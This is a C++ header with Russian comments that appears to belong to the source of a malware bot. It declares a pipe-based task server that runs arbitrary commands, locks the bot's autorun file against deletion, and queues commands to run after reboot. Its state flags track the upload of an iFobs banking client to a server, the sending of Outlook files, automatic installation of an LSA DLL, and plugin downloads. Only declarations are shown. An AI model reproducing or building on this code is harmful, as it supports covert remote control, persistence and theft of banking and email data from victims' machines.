#pragma once

#include "core\core.h"
#include "core\pipe.h"

//выполнение команд

namespace Task
{

bool Init();

//выполнение команды cmd.
//len нужно обязательно указать
//функция запускает выполнение команды в отдельном потоке
bool ExecCmd( const char* cmd, int len );

//открывает автозагрузочный файл бота, чтобы его не удалили
void ProtectBot();
//закрывает автозагрузочный файл, чтобы можно было его обновить
void UnprotectBot();
//добавляет команду которая выполнится после ребута
void AddStartCmd( const char* cmd );

const int GlobalState_IFobsUploaded = 0; //клиент ифобса загружен на сервер
const int GlobalState_AutoLsaDll = 1; //установлена ли автоматически указанная длл (дана ли автоматом команда secure lsa name_plugin)
const int GlobalState_OutlookFiles = 2; //файлы отлука уже отосланы
const int GlobalState_Plugin = 3; //откуда качать плагины: 0 - с админки, 1 - с сервера
const int GlobalState_LeftAutorun = 4; //авторан установлен плагином

}

//сервер выполнения задач (команд)
class TaskServer : public PipeServer
{
		char state; //сюда сохраняется глобавльное состония запрошенного флага, необходимо для отправки ответа
		
		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();
		//помещает в state текущее состояние 
		void GetGlobalState( int id );
		//устанавливает текущее состояние, помещает в state предыдущее значение
		void SetGlobalState( int id, char v );

	public:

		enum
		{
			CmdExecTask, //выполнить команду
			CmdGetGlobalState,	//изменить сохраняемое состояние бота
			CmdSetGlobalState,	//получить текущее глобальное состояние
			CmdAddStartCmd		//добавление команды для выполнения после ребута
		};

	public:
		
		TaskServer();
		~TaskServer();

		//регистрация в менеджере
		bool Reg();
		//передать серверу задач команду на выполнение, len обязательно указать
		static bool ExecTask( const char* namePipe, const char* cmd, int len );
};
